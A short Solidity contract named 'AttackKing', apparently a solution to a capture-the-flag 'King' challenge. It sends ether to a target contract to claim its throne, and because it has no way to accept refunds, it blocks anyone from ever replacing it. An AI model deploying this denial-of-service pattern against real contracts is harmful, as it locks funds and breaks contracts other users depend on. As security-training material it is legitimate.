// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

contract AttackKing {
    constructor(address payable _king) payable {
        (bool success, ) = address(_king).call{value: msg.value}("");
    }
}